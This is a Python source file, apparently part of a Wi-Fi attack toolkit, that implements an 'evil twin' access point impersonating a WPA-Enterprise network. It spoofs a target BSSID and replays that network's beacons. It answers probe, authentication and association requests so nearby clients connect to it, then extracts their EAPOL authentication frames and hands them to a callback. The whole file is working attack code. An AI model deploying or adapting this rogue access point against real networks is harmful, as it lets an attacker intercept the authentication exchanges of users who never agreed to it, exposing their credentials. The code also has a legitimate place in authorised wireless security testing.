from __future__ import annotations

import asyncio
import logging
import struct
import time
from collections.abc import Callable

from wifit3.dot11.ap import assoc_resp, auth_resp
from wifit3.dot11.eapol import LLC_SNAP_EAPOL
from wifit3.dot11.ie import iter_information_elements
from wifit3.dot11.mac import BROADCAST_MAC, header_len, mac_to_str, str_to_mac
from wifit3.dot11.packet import Packet

logger = logging.getLogger(__name__)

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000
_BEACON_BODY = 36
_ELEMID_TIM = 5
_SESSION_TIMEOUT_S = 30.0
_PROBE_REQ = 0x04
_AUTH = 0x0B
_REASSOC_REQ = 0x02


class EnterpriseFakeAP:
    def __init__(self, iface, bssid: bytes, ssid: str, channel: int, beacon: bytes,
                 rx_source=None, on_eapol: Callable[[bytes, bytes], None] | None = None):
        self.iface = iface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.beacon = beacon
        self.rx_source = rx_source
        self.on_eapol = on_eapol
        self._probe_resp = self._probe_resp_from(beacon)
        self._running = False
        self._fake_mac_armed = False
        self._rx_registered = False
        self._seen: dict[str, float] = {}
        self._tx_tasks: set[asyncio.Task] = set()
        self._beacon_task: asyncio.Task | None = None
        self._cleanup_task: asyncio.Task | None = None

    async def start(self) -> None:
        if self.iface.current_channel != self.channel:
            tuned = await self.iface.set_channel(self.channel)
            if not tuned:
                raise RuntimeError("Could not set channel")
        armed = await self.iface.set_fake_mac(self.bssid, self.bssid)
        if armed is None or str_to_mac(armed) != bytes(self.bssid):
            if armed is not None:
                await self.iface.clear_fake_mac()
            raise RuntimeError("Interface cannot spoof MAC address")
        self._fake_mac_armed = True
        if self.rx_source is not None:
            self.rx_source.register_rx_callback(self._on_rx)
            self._rx_registered = True
        self._running = True
        self._beacon_task = asyncio.create_task(self._beacon_loop())
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("enterprise ap on channel %s", self.channel)

    async def stop(self) -> None:
        self._running = False
        error = None
        if self._rx_registered:
            self._rx_registered = False
            try:
                self.rx_source.unregister_rx_callback(self._on_rx)
            except Exception as exc:
                error = exc
        tasks = list(self._tx_tasks)
        self._tx_tasks.clear()
        beacon_task, self._beacon_task = self._beacon_task, None
        cleanup_task, self._cleanup_task = self._cleanup_task, None
        if beacon_task is not None:
            tasks.append(beacon_task)
        if cleanup_task is not None:
            tasks.append(cleanup_task)
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as exc:
                error = error or exc
        if self._fake_mac_armed:
            self._fake_mac_armed = False
            try:
                await self.iface.clear_fake_mac()
            except Exception as exc:
                error = error or exc
        if error is not None:
            raise error

    async def _beacon_loop(self) -> None:
        failing = False
        while self._running:
            try:
                await self.iface.send_no_wait(self._restamp(self.beacon))
                failing = False
            except Exception:
                if not failing:
                    logger.exception("enterprise beacon send failed")
                failing = True
            await asyncio.sleep(_BEACON_PERIOD_S)

    async def _cleanup_loop(self) -> None:
        while self._running:
            now = time.time()
            stale = [mac for mac, seen in self._seen.items() if now - seen > _SESSION_TIMEOUT_S]
            for mac in stale:
                del self._seen[mac]
            await asyncio.sleep(5)

    @staticmethod
    def _probe_resp_from(beacon: bytes) -> bytes:
        elements = b"".join(
            raw for tag, _body, raw in iter_information_elements(beacon, _BEACON_BODY)
            if tag != _ELEMID_TIM)
        return b"\x50\x00" + beacon[2:4] + b"\x00" * 6 + beacon[10:_BEACON_BODY] + elements

    @staticmethod
    def _restamp(beacon: bytes) -> bytes:
        if len(beacon) < 32:
            return beacon
        return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]

    def _tx(self, frame: bytes) -> None:
        task = asyncio.create_task(self.iface.send_no_wait(frame))
        self._tx_tasks.add(task)
        task.add_done_callback(self._tx_tasks.discard)

    def _on_rx(self, pkt: Packet) -> None:
        raw = pkt.raw
        if not raw or len(raw) < 24:
            return
        addr1 = raw[4:10]
        client = raw[10:16]
        if pkt.type_id == 0:
            if pkt.subtype_id == _PROBE_REQ:
                if addr1 not in (BROADCAST_MAC, self.bssid):
                    return
                self._on_probe(pkt, client)
                return
            if addr1 != self.bssid:
                return
            if pkt.subtype_id == _AUTH:
                self._on_auth(client)
            elif pkt.subtype_id in (0x00, _REASSOC_REQ):
                self._on_assoc(pkt, client)
            return
        if pkt.type_id == 2 and addr1 == self.bssid:
            self._on_data(raw, client)

    def _on_probe(self, pkt: Packet, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None)
        if ssid not in (None, "", "<hidden>", self.ssid):
            return
        self._tx(self._probe_resp[:4] + client + self._probe_resp[10:])

    def _on_auth(self, client: bytes) -> None:
        self._seen[mac_to_str(client)] = time.time()
        self._tx(auth_resp(self.bssid, client))

    def _on_assoc(self, pkt: Packet, client: bytes) -> None:
        self._seen[mac_to_str(client)] = time.time()
        self._tx(assoc_resp(
            self.bssid, client, channel=self.channel,
            reassoc=pkt.subtype_id == _REASSOC_REQ, twin_beacon=self.beacon,
        ))

    def _on_data(self, raw: bytes, client: bytes) -> None:
        mac = mac_to_str(client)
        if mac not in self._seen:
            return
        self._seen[mac] = time.time()
        hdr = header_len(raw[0], raw[1])
        found = raw[hdr:hdr + 16].find(LLC_SNAP_EAPOL)
        if found < 0 or self.on_eapol is None:
            return
        self.on_eapol(raw[hdr + found + 8:], client)
